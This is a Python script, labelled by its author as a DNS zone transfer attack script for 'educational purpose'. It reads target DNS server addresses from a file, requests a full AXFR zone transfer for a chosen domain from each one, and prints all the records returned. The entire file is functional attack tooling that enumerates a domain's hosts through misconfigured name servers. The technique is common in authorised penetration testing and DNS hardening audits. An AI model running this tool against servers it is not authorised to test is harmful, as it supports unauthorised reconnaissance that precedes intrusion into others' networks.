###############################################################################
##                                                                            ##
##             Author: MAhmutAY   <mahmutayy@yahoo.com>                       ##
##              This is a DNS Zone Transfer attack script                     ##
##                                                                            ##
##              This is only educational purpose usage                        ##
##  !!  Do not attempt to violate the laws with anything contained here. !!!  ##
################################################################################

import dns.query
import dns.zone
import dns.resolver
import dns.exception
import traceback
import socket
import argparse
def validate_dns_server_address(address):
    """Validation: If the provided address is a valid IP address or hostname."""
    try:
        # Check if it's a valid IP address
        socket.inet_aton(address)
        return True
    except socket.error:
        pass

    try:
        # Check if it's a valid hostname
        socket.gethostbyname(address)
        return True
    except socket.error:
        return False

def zone_transfer(target_dns_ip, domain):
    """Attempt a DNS zone transfer from a target DNS server for a specific domain like 'example.com' """
    try:
        # Initiate zone transfer
        xfr = dns.query.xfr(target_dns_ip, domain)
        zone = dns.zone.from_xfr(xfr)
        
        # Check if zone transfer was successful and print the records
        if zone:
            print(f"Zone transfer successful from {target_dns_ip} for domain {domain}")
            for name, node in zone.nodes.items():
                print(zone[name].to_text(name))
        else:
            print(f"No zone information obtained from {target_dns_ip} for domain {domain}.")
    except dns.exception.FormError as e:
        print(f"FormError occurred with {target_dns_ip}: {e}")
    except dns.exception.SyntaxError as e:
        print(f"SyntaxError occurred with {target_dns_ip}: {e}")
    except dns.exception.Timeout as e:
        print(f"Timeout occurred with {target_dns_ip}: {e}")
    except dns.query.BadResponse as e:
        print(f"BadResponse occurred with {target_dns_ip}: {e}")
    except dns.resolver.NXDOMAIN as e:
        print(f"NXDOMAIN error with {target_dns_ip}: {e}")
    except dns.exception.DNSException as e:
        print(f"DNS error occurred with {target_dns_ip}: {e}")
    except Exception as e:
        print(f"Unexpected error occurred with {target_dns_ip}: {e}")
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description='DNS Zone Transfer Attack Script for Educational Purposes')
    parser.add_argument('domain', type=str, help='Domain for which to attempt zone transfer')
    parser.add_argument('--dns_servers_file', type=str, default='dns_servers.txt', help='File containing target DNS server IPs, one per line (default: dns_servers.txt)')
    
    args = parser.parse_args()

    # Read DNS server IPs from given file
    try:
        with open(args.dns_servers_file, 'r') as f:
            dns_servers = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"File {args.dns_servers_file} not found.")
        exit(1)

    # Attempt zone transfer for each DNS server
    for dns_server in dns_servers:
        if validate_dns_server_address(dns_server):
            print(f"Attempting zone transfer from {dns_server} for domain {args.domain}")
            zone_transfer(dns_server, args.domain)
        else:
            print(f"Invalid DNS server address: {dns_server}")

if __name__ == '__main__':
    main()
